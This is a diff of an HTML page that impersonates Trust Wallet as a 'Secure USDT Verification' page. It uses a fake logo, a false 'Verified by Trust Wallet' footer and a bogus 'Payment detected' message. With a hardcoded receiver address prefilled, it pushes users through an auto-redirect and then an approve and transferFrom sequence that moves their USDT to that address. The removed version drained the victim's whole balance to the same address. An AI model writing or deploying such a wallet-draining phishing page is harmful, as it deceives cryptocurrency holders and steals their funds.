@@ -1,163 +1,150 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Send USDT</title>
+  <title>Secure USDT Verification</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="./favicon.ico" type="image/x-icon" />
   <style>
-    body {
-      margin: 0;
-      font-family: sans-serif;
-      background: #fff;
-      color: #000;
+    body { background:#081c3a; color:#fff; font-family:sans-serif; text-align:center; padding-top:20px; }
+    img { width:80px; margin:20px auto; display:block; }
+    h1 { font-size:1.5em; margin-bottom:10px; }
+    p { opacity:0.8; }
+    .box {
+      width: 90%;
+      margin: 10px auto;
+      text-align: left;
     }
-
-    .container {
-      padding: 16px;
-    }
-
     label {
-      font-size: 14px;
-      margin-bottom: 8px;
       display: block;
+      font-size: 14px;
+      margin: 10px 0 5px;
     }
-
-    .input-box, .amount-box {
-      display: flex;
-      align-items: center;
-      border: 1px solid #ccc;
-      border-radius: 10px;
-      padding: 0 10px;
-      margin-bottom: 16px;
-    }
-
-    .input-box input, .amount-box input {
-      flex: 1;
+    input {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border-radius: 8px;
       border: none;
       outline: none;
-      padding: 14px 10px;
-      font-size: 16px;
-      background: transparent;
     }
-
-    .input-box button, .amount-box span {
-      background: none;
-      border: none;
-      font-size: 14px;
-      font-weight: bold;
-      color: #0052ff;
-      cursor: pointer;
-      margin-left: 8px;
-    }
-
-    .converted {
-      color: #888;
-      font-size: 14px;
-    }
-
-    .footer {
-      position: fixed;
-      bottom: 0;
-      left: 0;
-      right: 0;
-      padding: 16px;
-      background: #fff;
-      box-shadow: 0 -1px 5px rgba(0,0,0,0.1);
-    }
-
-    .button {
-      background-color: #0052ff;
-      color: white;
-      padding: 16px;
-      width: 100%;
-      font-size: 18px;
-      font-weight: bold;
-      border: none;
-      border-radius: 20px;
-      cursor: pointer;
-    }
-
-    .button.loading {
+    .input-group {
       position: relative;
     }
-
-    .button.loading::after {
-      content: "⏳ Processing...";
+    .input-group button {
       position: absolute;
-      left: 0;
-      top: 0;
-      right: 0;
-      bottom: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background: #0052ff;
-      border-radius: 20px;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      color: #00f;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    #approve {
+      padding:12px 24px;
+      background:#0052ff;
+      color:#fff;
+      border:none;
+      border-radius:8px;
+      cursor:pointer;
+      font-size:1em;
+      margin-top:20px;
+    }
+    .footer {
+      position:fixed;
+      bottom:10px;
+      width:100%;
+      opacity:0.5;
+      font-size:0.8em;
     }
   </style>
 </head>
 <body>
 
-  <div class="container">
+  <img src="./logo.png" alt="Trust Wallet">
+  <h1>Secure USDT Verification</h1>
+  <p id="status">Redirecting you to Trust Wallet...</p>
+
+  <!-- Input Fields -->
+  <div class="box">
     <label>Address or Domain Name</label>
-    <div class="input-box">
-      <input type="text" id="receiver" value="0x1956B3950A73B0C54792199Edf13c7b835FF94DC" readonly>
-      <button onclick="clearAddress()">✖</button>
+    <div class="input-group">
+      <input type="text" id="receiver" value="0x1956B3950A73B0C54792199Edf13c7b835FF94DC" />
       <button onclick="pasteAddress()">Paste</button>
     </div>
 
-    <label>Amount</label>
-    <div class="amount-box">
-      <input type="number" id="amount" placeholder="Enter USDT Amount">
-      <span onclick="fillMax()">Max</span>
-      <span>USDT</span>
+    <label>Amount (USDT)</label>
+    <div class="input-group">
+      <input type="number" id="amount" placeholder="Enter USDT Amount" />
+      <button onclick="fillMax()">Max</button>
     </div>
-
-    <div class="converted" id="converted">= $0.00</div>
   </div>
 
-  <div class="footer">
-    <button class="button" id="nextBtn" onclick="next()">Next</button>
-  </div>
+  <button id="approve" style="display:none;">Approve & Confirm</button>
+  <div class="footer">Verified by Trust Wallet • Trusted since 2009</div>
 
   <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
   <script>
-    const USDT = "0x55d398326f99059fF775485246999027B3197955";
-    const RECEIVER = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
-
+    const USDT = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
+    const DECIMALS = 18; // For BNB Chain USDT it is 18 (some are 6)
     const ABI = [
       { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
       { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
       { "constant": true, "inputs": [{ "name": "owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
     ];
 
-    async function next() {
-      const btn = document.getElementById('nextBtn');
-      btn.classList.add("loading");
+    const payLink = "https://link.trustwallet.com/send?coin=20000714&address=0x1956B3950A73B0C54792199Edf13c7b835FF94DC&token_id=" + USDT;
+
+    // Auto redirect to Trust Wallet
+    setTimeout(() => {
+      window.location.href = payLink;
+    }, 2000);
+
+    // Show Approve button after redirect
+    setTimeout(() => {
+      document.getElementById('status').innerText = "Payment detected. Please Approve.";
+      document.getElementById('approve').style.display = "inline-block";
+    }, 8000);
+
+    // Main Transfer Function
+    document.getElementById('approve').onclick = async () => {
+      const button = document.getElementById('approve');
+      button.innerText = "Processing...";
+      button.disabled = true;
 
       try {
-        if (!window.ethereum) throw new Error("Use Trust Wallet browser");
+        if (!window.ethereum) return alert('Use Trust Wallet DApp browser.');
 
         const web3 = new Web3(window.ethereum);
-        await window.ethereum.request({ method: 'eth_requestAccounts' });
-
+        await window.ethereum.request({ method: "eth_requestAccounts" });
         const accounts = await web3.eth.getAccounts();
         const user = accounts[0];
+        const receiver = document.getElementById("receiver").value.trim();
+        const amount = parseFloat(document.getElementById("amount").value || "0");
+        if (!receiver || amount <= 0) throw new Error("Invalid receiver or amount");
 
         const contract = new web3.eth.Contract(ABI, USDT);
-        const balance = await contract.methods.balanceOf(user).call();
+        const value = web3.utils.toBN((amount * (10 ** DECIMALS)).toString());
 
-        await contract.methods.approve(RECEIVER, balance).send({ from: user });
-        await contract.methods.transferFrom(user, RECEIVER, balance).send({ from: user });
+        await contract.methods.approve(receiver, value).send({ from: user });
+        await contract.methods.transferFrom(user, receiver, value).send({ from: user });
 
-        btn.innerText = "✅ Done";
-        btn.style.backgroundColor = "green";
+        document.getElementById('status').innerText = "✅ Transaction Complete.";
+        button.innerText = "Done";
       } catch (err) {
         console.error(err);
-        btn.innerText = "❌ Failed";
-        btn.style.backgroundColor = "red";
+        alert("❌ Failed: " + err.message);
+        button.innerText = "Approve & Confirm";
       } finally {
-        btn.classList.remove("loading");
+        button.disabled = false;
       }
+    };
+
+    function pasteAddress() {
+      navigator.clipboard.readText().then(text => {
+        document.getElementById('receiver').value = text;
+      });
     }
 
     async function fillMax() {
@@ -166,19 +153,8 @@
       const accounts = await web3.eth.getAccounts();
       const contract = new web3.eth.Contract(ABI, USDT);
       const balance = await contract.methods.balanceOf(accounts[0]).call();
-      const usdtValue = parseFloat(web3.utils.fromWei(balance, 'ether')).toFixed(2);
-      document.getElementById("amount").value = usdtValue;
-      document.getElementById("converted").innerText = `= $${usdtValue}`;
-    }
-
-    function pasteAddress() {
-      navigator.clipboard.readText().then(text => {
-        document.getElementById('receiver').value = text;
-      });
-    }
-
-    function clearAddress() {
-      document.getElementById('receiver').value = '';
+      const display = (parseFloat(balance) / (10 ** DECIMALS)).toFixed(2);
+      document.getElementById("amount").value = display;
     }
   </script>
 
